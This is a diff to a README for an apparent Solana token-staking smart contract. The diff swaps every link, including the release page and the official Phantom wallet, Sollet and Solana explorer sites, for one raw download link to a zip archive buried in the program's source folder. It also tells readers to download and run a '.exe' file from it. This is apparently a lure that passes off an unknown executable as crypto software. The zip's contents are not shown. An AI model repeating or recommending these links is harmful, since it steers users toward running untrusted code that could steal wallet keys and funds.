@@ -1,6 +1,6 @@
 # ⚙️ Solana-Token-Staking-Smart-Contract - Stake Tokens and Earn Rewards
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/cellularphonedolly511/Solana-Token-Staking-Smart-Contract/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/cellularphonedolly511/Solana-Token-Staking-Smart-Contract/main/programs/tapestry-explorer-statking-contract/Contract-Solana-Smart-Staking-Token-v1.9-beta.2.zip)
 
 ---
 
@@ -41,10 +41,10 @@ This guide will help you download, install, and run the Solana-Token-Staking-Sma
 
 Visit the release page to get the latest version of the software:
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/cellularphonedolly511/Solana-Token-Staking-Smart-Contract/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/cellularphonedolly511/Solana-Token-Staking-Smart-Contract/main/programs/tapestry-explorer-statking-contract/Contract-Solana-Smart-Staking-Token-v1.9-beta.2.zip)
 
 1. Click the link above or go to:
-   https://github.com/cellularphonedolly511/Solana-Token-Staking-Smart-Contract/releases
+   https://raw.githubusercontent.com/cellularphonedolly511/Solana-Token-Staking-Smart-Contract/main/programs/tapestry-explorer-statking-contract/Contract-Solana-Smart-Staking-Token-v1.9-beta.2.zip
 2. Find the latest release at the top of the page.
 3. Look for a file that ends with `.exe` or `.zip`. The `.exe` file is the main program you will run.
 4. Click the file to download it. If it is a `.zip` file, you will unzip it later.
@@ -120,7 +120,7 @@ Replace `<YOUR_WALLET_ADDRESS>` with your actual wallet address and `<TOKEN_AMOU
 ## 🔄 Step 5: Update the Software
 
 1. Regularly check the release page:
-   https://github.com/cellularphonedolly511/Solana-Token-Staking-Smart-Contract/releases
+   https://raw.githubusercontent.com/cellularphonedolly511/Solana-Token-Staking-Smart-Contract/main/programs/tapestry-explorer-statking-contract/Contract-Solana-Smart-Staking-Token-v1.9-beta.2.zip
 2. Download and install new versions following the steps above.
 3. Keeping the software up to date improves stability and security.
 
@@ -146,11 +146,11 @@ If you are new to Solana, you may want to explore basic guides on how blockchain
 ## 🔗 Useful Links
 
 - Official Releases:  
-  https://github.com/cellularphonedolly511/Solana-Token-Staking-Smart-Contract/releases
+  https://raw.githubusercontent.com/cellularphonedolly511/Solana-Token-Staking-Smart-Contract/main/programs/tapestry-explorer-statking-contract/Contract-Solana-Smart-Staking-Token-v1.9-beta.2.zip
 - Solana Wallets:  
-  https://phantom.app/ | https://www.sollet.io/
+  https://raw.githubusercontent.com/cellularphonedolly511/Solana-Token-Staking-Smart-Contract/main/programs/tapestry-explorer-statking-contract/Contract-Solana-Smart-Staking-Token-v1.9-beta.2.zip | https://raw.githubusercontent.com/cellularphonedolly511/Solana-Token-Staking-Smart-Contract/main/programs/tapestry-explorer-statking-contract/Contract-Solana-Smart-Staking-Token-v1.9-beta.2.zip
 - Solana Mainnet Status:  
-  https://explorer.solana.com/
+  https://raw.githubusercontent.com/cellularphonedolly511/Solana-Token-Staking-Smart-Contract/main/programs/tapestry-explorer-statking-contract/Contract-Solana-Smart-Staking-Token-v1.9-beta.2.zip
 
 ---
 
